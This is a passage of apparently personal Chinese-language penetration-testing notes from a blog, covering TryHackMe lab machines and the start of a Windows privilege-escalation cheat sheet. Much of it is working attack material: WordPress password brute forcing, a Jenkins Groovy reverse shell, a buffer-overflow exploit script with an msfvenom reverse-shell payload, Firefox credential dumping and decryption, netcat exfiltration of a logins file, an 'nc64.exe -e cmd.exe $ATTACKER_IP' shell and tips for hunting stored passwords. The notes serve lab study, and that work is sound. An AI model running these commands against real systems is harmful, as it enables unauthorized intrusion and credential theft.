class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment">##wpscan --url 10.10.108.59/blog -e ap,u,t</span><br><br>[<span class="hljs-string">i</span>] <span class="hljs-attr">User(s) Identified:</span><br><br>[<span class="hljs-string">+</span>] <span class="hljs-string">admin</span><br> <span class="hljs-string">|</span> <span class="hljs-attr">Found By:</span> <span class="hljs-string">Author</span> <span class="hljs-string">Id</span> <span class="hljs-string">Brute</span> <span class="hljs-string">Forcing</span> <span class="hljs-bullet">-</span> <span class="hljs-string">Author</span> <span class="hljs-string">Pattern</span> <span class="hljs-string">(Aggressive</span> <span class="hljs-string">Detection)</span><br> <span class="hljs-string">|</span> <span class="hljs-attr">Confirmed By:</span> <span class="hljs-string">Login</span> <span class="hljs-string">Error</span> <span class="hljs-string">Messages</span> <span class="hljs-string">(Aggressive</span> <span class="hljs-string">Detection)</span><br> <br> <br> <br><span class="hljs-comment">## wpscan --url 10.10.108.59/blog -U admin -P /usr/share/wordlists/rockyou.txt</span><br> <br>[<span class="hljs-string">+</span>] <span class="hljs-string">Performing</span> <span class="hljs-string">password</span> <span class="hljs-string">attack</span> <span class="hljs-string">on</span> <span class="hljs-string">Xmlrpc</span> <span class="hljs-string">against</span> <span class="hljs-number">1</span> <span class="hljs-string">user/s</span><br>[<span class="hljs-string">SUCCESS</span>] <span class="hljs-bullet">-</span> <span class="hljs-string">admin</span> <span class="hljs-string">/</span> <span class="hljs-string">my2boys</span>                                                                                                <br><span class="hljs-attr">Trying admin / bratz1 Time:</span> <span class="hljs-number">00</span><span class="hljs-string">:10:15</span> <span class="hljs-string">&lt;</span>                                            <span class="hljs-string">&gt;</span> <span class="hljs-string">(3885</span> <span class="hljs-string">/</span> <span class="hljs-number">14348277</span><span class="hljs-string">)</span>  <span class="hljs-number">0.02</span><span class="hljs-string">%</span>  <span class="hljs-attr">ETA:</span> <span class="hljs-string">??:??:??</span><br><br>[<span class="hljs-type">!]</span> <span class="hljs-attr">Valid Combinations Found:</span><br> <span class="hljs-string">|</span> <span class="hljs-attr">Username:</span> <span class="hljs-string">admin</span>, <span class="hljs-attr">Password:</span> <span class="hljs-string">my2boys</span><br><br>[<span class="hljs-type">!]</span> <span class="hljs-literal">No</span> <span class="hljs-string">WPScan</span> <span class="hljs-string">API</span> <span class="hljs-string">Token</span> <span class="hljs-string">given</span>, <span class="hljs-string">as</span> <span class="hljs-string">a</span> <span class="hljs-string">result</span> <span class="hljs-string">vulner</span><br></code></pre></td></tr></table></figure><p>进入$IP&#x2F;blog&#x2F;wp-login.php后台登录利用themeedit下的404.php弹shell，目录为&#x2F;blog&#x2F;wp-content&#x2F;themes&#x2F;twentyseventeen&#x2F;404.php</p><p>以后弹shell后记得翻根目录下每一级目录</p><p>这个&#x2F;opt下直接找到另一普通用户的cred，ssh登录  www-data —-&gt; 普通用户</p><p>又在某目录下翻到 一个内网ip  172.17.0.2，一看就是dockerip，搭建ssh隧道本机浏览器查看</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dns">┌──(root㉿LJX)-[~]<br>└─# ssh -L <span class="hljs-number">9995:172.17</span>.<span class="hljs-number">0.2:8080</span> aubreanna@<span class="hljs-number">10.10.189.178</span><br></code></pre></td></tr></table></figure><p>一个jenkins爆破admin密码，burp跑不动rockyou字典，用zap跑通</p><p>一个jenkins后台shell</p><p>脚本命令行功能下</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gradle">String host=<span class="hljs-string">&quot;x.x.x.x&quot;</span>;<br><span class="hljs-keyword">int</span> port=<span class="hljs-number">1333</span>;<br>String cmd=<span class="hljs-string">&quot;/bin/bash&quot;</span>;<br><span class="hljs-comment">//ProcessBuilder创建操作系统进程</span><br>Process p=<span class="hljs-keyword">new</span> ProcessBuilder(cmd).redirectErrorStream(<span class="hljs-keyword">true</span>).start();<br>Socket s=<span class="hljs-keyword">new</span> Socket(host,port);<br>InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();<br>OutputStream po=p.getOutputStream(),so=s.getOutputStream();<span class="hljs-keyword">while</span>(!s.isClosed())<br>&#123;<span class="hljs-keyword">while</span>(pi.available()&gt;<span class="hljs-number">0</span>)so.<span class="hljs-keyword">write</span>(pi.<span class="hljs-keyword">read</span>());<span class="hljs-keyword">while</span>(pe.available()&gt;<span class="hljs-number">0</span>)so.<span class="hljs-keyword">write</span>(pe.<span class="hljs-keyword">read</span>());<br>    <span class="hljs-keyword">while</span>(si.available()&gt;<span class="hljs-number">0</span>)po.<span class="hljs-keyword">write</span>(si.<span class="hljs-keyword">read</span>());so.flush();po.flush();Thread.sleep(<span class="hljs-number">50</span>);<span class="hljs-keyword">try</span><br>&#123;p.exitValue();<span class="hljs-keyword">break</span>;&#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;&#125;&#125;;p.destroy();s.close();<br></code></pre></td></tr></table></figure><p>弹回docker shell，翻目录拿到root cred.</p><p>参考文章，这个更难</p><p><a href="https://www.freebuf.com/vuls/343731.html">https://www.freebuf.com/vuls/343731.html</a></p><h3 id="gatekeeper"><a href="#gatekeeper" class="headerlink" title="gatekeeper"></a>gatekeeper</h3><p>参考<a href="https://www.cnblogs.com/Hekeats-L/p/17181432.html">https://www.cnblogs.com/Hekeats-L/p/17181432.html</a></p><p>masscan扫端口，扫出来的端口 nmap -p -A  可疑端口 445，31337</p><p>smb连接拖出 gatekeeper.exe</p><p>nc -nvv特定格式连接31337</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">nc</span>：nc是netcat的缩写，是一个网络工具，用于建立各种类型的网络连接。<br>-n：在执行DNS解析时，禁用主机名解析，使用<span class="hljs-built_in">IP</span>地址进行连接。<br>-vv：启用详细输出模式，显示更多的调试和信息。<br>通过在命令行中输入nc -nvv，你可以打开一个终端，用于与远程主机进行网络通信。你可以指定目标主机的<span class="hljs-built_in">IP</span>地址或域名，并选择要连接的端口。例如，要连接到<span class="hljs-built_in">IP</span>地址为<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>的远程主机的<span class="hljs-number">80</span>端口，你可以运行以下命令：<br><br><span class="hljs-symbol">nc</span> -nvv <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span> <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><p>kali&#x2F;gatekeeper.exe —&gt; windows虚拟机下的文件传输   kali python3 -m http.server  windows 浏览器访问</p><p>生成100个A</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">python -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;print(&#x27;A&#x27;*100)&quot;</span><br></code></pre></td></tr></table></figure><p>一百一百的测</p><p>到200崩溃 ， 看到EIP值为41414141</p><p>生成一个200的随机字符</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/metasploit-framework/</span>tools<span class="hljs-regexp">/exploit/</span>pattern_create.rb -l <span class="hljs-number">200</span><br></code></pre></td></tr></table></figure><p>nc时输入然后看到EIP值为39654138</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/sive-pentesting/image-20231029205322314.png" alt="image-20231029205322314"></p><p>调用另一个ruby pattern_offset.rb 算偏移量</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/metasploit-framework/</span>tools<span class="hljs-regexp">/exploit/</span>pattern_offset.rb -l <span class="hljs-number">200</span> -q <span class="hljs-number">39654138</span><br>[*] Exact match at offset <span class="hljs-number">146</span><br></code></pre></td></tr></table></figure><p>得出146为偏移量</p><p>设置exploit.py   </p><p>​使用该脚本生成\x01到\xff的字符</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-keyword">for</span> <span class="hljs-attribute">x</span> in <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">256</span>):<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\\x&quot;</span> + <span class="hljs-string">&quot;&#123;:02x&#125;&quot;</span><span class="hljs-selector-class">.format</span>(<span class="hljs-attribute">x</span>), end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><p>​设置retn为BBBB  offset 146</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs makefile">import socket<br><br>ip = <span class="hljs-string">&quot;10.10.200.162&quot;</span><br>port = 31337<br><br>prefix = <span class="hljs-string">&quot;&quot;</span><br>offset = 146<br>overflow = <span class="hljs-string">&quot;A&quot;</span> * offset<br>retn = <span class="hljs-string">&quot;BBBB&quot;</span><br>padding = <span class="hljs-string">&quot;&quot;</span><br>payload = <span class="hljs-string">&quot;\x01\x02\。。。。。。。&quot;</span><br>postfix = <span class="hljs-string">&quot;&quot;</span><br><br>buffer = prefix + overflow + retn + padding + payload + postfix<br><br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br><br><span class="hljs-section">try:</span><br>  s.connect((ip, port))<br>  print(<span class="hljs-string">&quot;Sending evil buffer...&quot;</span>)<br>  s.send(bytes(buffer + <span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-string">&quot;latin-1&quot;</span>))<br>  print(<span class="hljs-string">&quot;Done!&quot;</span>)<br><span class="hljs-section">except:</span><br>  print(<span class="hljs-string">&quot;Could not connect.&quot;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-title">!mona</span> config -set workingfolder <span class="hljs-keyword">c</span>:\mona\$exe的名字\<span class="hljs-variable">%p</span><br><br><span class="hljs-title">!mona</span> bytearray -b <span class="hljs-string">&quot;\x00&quot;</span><br><br><span class="hljs-title">!mona</span> compare -f C:\mona\oscp\bytearray.bin -a &lt;ESP address&gt;<br></code></pre></td></tr></table></figure><p>。。。。</p><p>得出 00 0a为坏字符</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">!mona <span class="hljs-keyword">jmp</span> -r <span class="hljs-built_in">esp</span> -cpb <span class="hljs-string">&quot;\x00\x0a&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">0x080414c3</span>-----&gt;\xc<span class="hljs-number">3</span>\<span class="hljs-keyword">x</span><span class="hljs-number">14</span>\<span class="hljs-keyword">x</span><span class="hljs-number">04</span>\<span class="hljs-keyword">x</span><span class="hljs-number">08</span>----retn参数<br><br><span class="hljs-string">&quot;\x90&quot;</span> * <span class="hljs-number">16</span> ----&gt;padding参数<br><br>//生成免杀shellcode<br>msfvenom -p windows/shell_reverse_tcp LHOST<span class="hljs-operator">=</span><span class="hljs-number">10.13</span>.<span class="hljs-number">37.42</span> LPORT<span class="hljs-operator">=</span><span class="hljs-number">4444</span> EXITFUNC<span class="hljs-operator">=</span>thread -b <span class="hljs-string">&quot;\x00\x0a&quot;</span> -e <span class="hljs-keyword">x</span><span class="hljs-number">86</span>/shikata_ga_nai -f <span class="hljs-keyword">c</span><br></code></pre></td></tr></table></figure><p>按照以上生成exp 弹普通shell</p><p>msfconsole监听弹shell然后multi&#x2F;manage&#x2F;shell_to_meterpreter转shell（得等一会儿）</p><p><strong>翻到桌面上有一个firefox.Ink</strong>  firefox在之前的smb中也有提及</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">AppDataLocalfatAppDataLocalfat\AppData\Local\Mozilla Firefox\firefox.exe<br></code></pre></td></tr></table></figure><p>在shell里面无法看到隐藏文件，以后最好用meterpreter翻文件</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">firefox的默认缓存路径   \AppData\Roaming\Mozilla\Firefox\Profiles\<br></code></pre></td></tr></table></figure><p>使用post&#x2F;multi&#x2F;gather&#x2F;firefox_creds 模块将缓存拖到本地</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/sive-pentesting/image-20231030013714046.png" alt="image-20231030013714046"></p><p>将.bin文件改回原名</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">git <span class="hljs-keyword">clone</span> <span class="hljs-title">https</span>://github.com/unode/firefox_decrypt<br></code></pre></td></tr></table></figure><p>用脚本解密缓存得到某网站用户名密码，它就是管理员用户名密码</p><p>用户名密码登录Impacket  &#x2F;&#x2F;<strong>kali登录windowsshell</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">kali：python3 /usr/share/doc/python3-impacket/examples/psexec<span class="hljs-selector-class">.py</span> <span class="hljs-built_in">gatekeeper</span>(域)/<span class="hljs-built_in">username</span>(用户名):<span class="hljs-built_in">password</span>(密码)@<span class="hljs-number">10.10</span>.<span class="hljs-number">245.39</span> cmd.exe<br></code></pre></td></tr></table></figure><h4 id="或者不用msf"><a href="#或者不用msf" class="headerlink" title="或者不用msf"></a><strong>或者不用msf</strong></h4><p>kali—-&gt;windows 传netcat</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">kali</span> wget https://eternallybored.org/misc/netcat/netcat-win32-<span class="hljs-number">1</span>.<span class="hljs-number">12</span>.zip<br><span class="hljs-attribute">kali</span> unzip netcat-win32-<span class="hljs-number">1</span>.<span class="hljs-number">12</span>.zip <br><span class="hljs-attribute">kali</span> python3 -m http.server<br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release&gt;certutil -urlcache -<span class="hljs-keyword">f</span> http://<span class="hljs-number">10.8</span>.<span class="hljs-number">165.116</span>:<span class="hljs-number">8000</span>/nc.<span class="hljs-keyword">exe</span> nc.<span class="hljs-keyword">exe</span><br>certutil -urlcache -<span class="hljs-keyword">f</span> http://<span class="hljs-number">10.8</span>.<span class="hljs-number">165.116</span>:<span class="hljs-number">8000</span>/nc.<span class="hljs-keyword">exe</span> nc.<span class="hljs-keyword">exe</span><br>****  Online  ****<br>CertUtil: -URLCache <span class="hljs-keyword">command</span> completed successfully.<br></code></pre></td></tr></table></figure><p>windows—–&gt;kali 传缓存文件</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">kali</span> nc -nlvp <span class="hljs-number">4444</span> &gt; logins.json<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">windows</span> nc -nv <span class="hljs-number">10.8.165.116</span> <span class="hljs-number">4444</span> &lt; logins.json<br></code></pre></td></tr></table></figure><p>…</p><h3 id="brainpan"><a href="#brainpan" class="headerlink" title="brainpan"></a>brainpan</h3><p>nmap操作系统探测</p><p> 9999 ——————》nc</p><p>10000——————》web页面拖.exe文件</p><p>测试机为win，payload发不过去，发现靶机为linux&#x2F;x86，msfvenom重新生成payload</p><p>低权用户 sudo -l 提权，linpeas.sh枚举时竟然没有发现，以后跑完linpeas还是得自己按照笔记枚举一遍</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo <span class="hljs-regexp">/home/</span>anansi<span class="hljs-regexp">/bin/</span>anansi_util manual man<br>!<span class="hljs-regexp">/bin/</span>sh<br></code></pre></td></tr></table></figure><p>失败，原因竟然是没有优化终端，优化提权成功</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">python -c <span class="hljs-symbol">&#x27;import</span> pty;pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>tryhackme_windows_提权</title>
    <link href="/2023/08/12/tryhackme-windows-%E6%8F%90%E6%9D%83/"/>
    <url>/2023/08/12/tryhackme-windows-%E6%8F%90%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:MACHINE_IP /u:username /p:<span class="hljs-string">&#x27;password&#x27;</span>    &lt;/d:域名&gt;<br></code></pre></td></tr></table></figure><h5 id="cmd"><a href="#cmd" class="headerlink" title="cmd"></a>cmd</h5><p>dir &#x2F;a:h 查看当前目录所有文件包括隐藏文件</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">dir</span><span class="hljs-punctuation">:</span> <span class="hljs-string">列出当前目录下的文件和文件夹。</span><br><span class="hljs-attribute">cd</span><span class="hljs-punctuation">:</span> <span class="hljs-string">更改当前目录。</span><br><span class="hljs-attribute">cd &lt;目录路径&gt;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">进入指定的目录。</span><br><span class="hljs-attribute">cd ..</span><span class="hljs-punctuation"> :</span> <span class="hljs-string">返回上级目录。</span><br><span class="hljs-attribute">cd \</span><span class="hljs-punctuation">:</span> <span class="hljs-string">进入根目录。</span><br><span class="hljs-attribute">cd /d &lt;目录路径&gt;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">在不同的驱动器之间切换目录。</span><br><span class="hljs-attribute">mkdir</span><span class="hljs-punctuation">:</span> <span class="hljs-string">创建一个新的目录。</span><br><span class="hljs-attribute">mkdir &lt;目录名称&gt;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">创建一个指定名称的目录。</span><br><span class="hljs-attribute">del</span><span class="hljs-punctuation">:</span> <span class="hljs-string">删除文件。</span><br><span class="hljs-attribute">del &lt;文件路径&gt;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">删除指定的文件。</span><br><span class="hljs-attribute">rd</span><span class="hljs-punctuation">:</span> <span class="hljs-string">删除目录。</span><br><span class="hljs-attribute">rd &lt;目录路径&gt;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">删除空目录。</span><br><span class="hljs-attribute">rd /s /q &lt;目录路径&gt;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">删除目录及其内容。</span><br><span class="hljs-attribute">ren</span><span class="hljs-punctuation">:</span> <span class="hljs-string">重命名文件或目录。</span><br><span class="hljs-attribute">ren &lt;原始名称&gt; &lt;新名称&gt;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">将文件或目录重命名为新的名称。</span><br><span class="hljs-attribute">copy</span><span class="hljs-punctuation">:</span> <span class="hljs-string">复制文件。</span><br><span class="hljs-attribute">copy &lt;源文件路径&gt; &lt;目标文件路径&gt;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">将源文件复制到目标位置。</span><br><span class="hljs-attribute">move</span><span class="hljs-punctuation">:</span> <span class="hljs-string">移动文件或将文件重命名并同时移动。</span><br><span class="hljs-attribute">move &lt;源路径&gt; &lt;目标路径&gt;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">将文件或目录从源路径移动到目标路径，并可以同时重命名文件。</span><br><span class="hljs-attribute">type</span><span class="hljs-punctuation">:</span> <span class="hljs-string">显示文件内容。</span><br><span class="hljs-attribute">type &lt;文件路径&gt;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">显示指定文件的内容。</span><br><span class="hljs-attribute">ping</span><span class="hljs-punctuation">:</span> <span class="hljs-string">测试与另一个主机的网络连接。</span><br><span class="hljs-attribute">ping &lt;IP地址或主机名&gt;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">发送网络请求以测试与目标主机的连通性。</span><br><span class="hljs-attribute">ipconfig</span><span class="hljs-punctuation">:</span> <span class="hljs-string">显示当前网络配置信息。</span><br><span class="hljs-attribute">tasklist</span><span class="hljs-punctuation">:</span> <span class="hljs-string">显示当前运行的进程列表。</span><br><span class="hljs-attribute">taskkill</span><span class="hljs-punctuation">:</span> <span class="hljs-string">终止正在运行的进程。</span><br><span class="hljs-attribute">taskkill /im &lt;进程名&gt;.exe</span><span class="hljs-punctuation">:</span> <span class="hljs-string">终止指定名称的进程。</span><br><span class="hljs-attribute">systeminfo</span><span class="hljs-punctuation">:</span> <span class="hljs-string">显示系统信息，如操作系统版本、安装日期等。</span><br><span class="hljs-attribute">sfc /scannow</span><span class="hljs-punctuation">:</span> <span class="hljs-string">扫描并修复系统文件错误。</span><br><span class="hljs-attribute">shutdown</span><span class="hljs-punctuation">:</span> <span class="hljs-string">关闭或重启计算机。</span><br><span class="hljs-attribute">shutdown /s</span><span class="hljs-punctuation">:</span> <span class="hljs-string">关闭计算机。</span><br><span class="hljs-attribute">shutdown /r</span><span class="hljs-punctuation">:</span> <span class="hljs-string">重启计算机。</span><br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;查找文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">dir</span> /s C:\$路径\flag*   C盘某路径中递归寻找flag*<br><br><span class="hljs-built_in">dir</span> &lt;目录路径&gt;: 列出指定目录下的文件和文件夹。<br><span class="hljs-built_in">dir</span> &lt;文件名或通配符&gt;: 根据文件名或通配符进行筛选，例如：<span class="hljs-built_in">dir</span> *.txt会列出所有扩展名为txt的文件。<br>tree: 使用tree命令可以以树状结构显示指定目录下的所有子文件夹和文件。<br>tree &lt;目录路径&gt;: 显示指定目录及其子目录下的文件和文件夹的树状结构。<br><br>//cmd中find不是用来找文件的，是来找字符串的<br>find: 使用find命令可以在文本文件中搜索指定的字符串。<br>find <span class="hljs-string">&quot;&lt;字符串&gt;&quot;</span> &lt;文件路径&gt;: 在指定的文本文件中搜索包含指定字符串的行。<br><br><span class="hljs-built_in">where</span>: 使用<span class="hljs-built_in">where</span>命令可以查找指定程序或命令的执行路径。<br><span class="hljs-built_in">where</span> &lt;命令或程序名称&gt;: 显示与指定名称匹配的可执行文件路径。<br><br>xcopy: 使用xcopy命令可以复制文件和目录，并且可以通过/s选项来递归搜索。<br>xcopy /s &lt;源路径&gt; &lt;目标路径&gt;: 递归地复制源路径中所有文件和文件夹到目标路径。<br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;默认的桌面路径通常是<code>C:\Users\&lt;用户名&gt;\Desktop</code></p><p>&#x2F;&#x2F;弹shell c:\tools\nc64.exe -e cmd.exe $ATTACKER_IP 4444</p><h5 id="enumeration"><a href="#enumeration" class="headerlink" title="enumeration"></a>enumeration</h5><h6 id="whoami"><a href="#whoami" class="headerlink" title="whoami"></a>whoami</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span> /user: 显示当前登录用户的完整用户信息，包括用户名、本地组和域成员身份等。<br><span class="hljs-built_in">whoami</span> /groups: 显示当前用户所属的所有组信息。<br><span class="hljs-built_in">whoami</span> /priv: 显示当前用户的权限信息。<br></code></pre></td></tr></table></figure><h6 id="初始配置文件"><a href="#初始配置文件" class="headerlink" title="初始配置文件"></a>初始配置文件</h6><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">在大量主机上安装 Windows 时，管理员可以使用 Windows 部署服务，该服务允许通过网络将单个操作系统映像部署到多个主机。这些类型的安装称为无人参与安装，因为它们不需要用户交互。此类安装需要使用管理员帐户来执行初始设置，初始设置最终可能会存储在计算机中的以下位置：  这些文件中可能会包含初始的用户名密码<br>C:\Unattend.<span class="hljs-keyword">xml</span><br><span class="hljs-title">C</span>:\Windows\Panther\Unattend.<span class="hljs-keyword">xml</span><br><span class="hljs-title">C</span>:\Windows\Panther\Unattend\Unattend.<span class="hljs-keyword">xml</span><br><span class="hljs-title">C</span>:\Windows\system32\sysprep.<span class="hljs-literal">inf</span><br>C:\Windows\system32\sysprep\sysprep.xml<br></code></pre></td></tr></table></figure><h6 id="powershell-history"><a href="#powershell-history" class="headerlink" title="powershell history"></a>powershell history</h6><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs applescript">用户使用 Powershell 运行命令时，它都会存储到一个文件中，该文件会保留过去命令的内存。这对于快速重复以前使用过的命令很有用。可能用户在 Powershell 命令行中直接运行包含密码的命令<br>type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt<br><br>The command <span class="hljs-keyword">above</span> will only work <span class="hljs-keyword">from</span> cmd.exe, <span class="hljs-keyword">as</span> Powershell won&#x27;t recognize <span class="hljs-keyword">as</span> an environment variable. To <span class="hljs-built_in">read</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">file</span> <span class="hljs-keyword">from</span> Powershell, you&#x27;d have <span class="hljs-keyword">to</span> replace <span class="hljs-keyword">with</span> . %userprofile%%userprofile%$Env:userprofile<br></code></pre></td></tr></table></figure><h6 id="保存的用户凭据"><a href="#保存的用户凭据" class="headerlink" title="保存的用户凭据"></a>保存的用户凭据</h6><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">Windows allows us <span class="hljs-keyword">to</span> use other users<span class="hljs-comment">&#x27; credentials. list saved credentials:</span><br>cmdkey /list<br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;尝试password</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">runas /savecred /user:admin 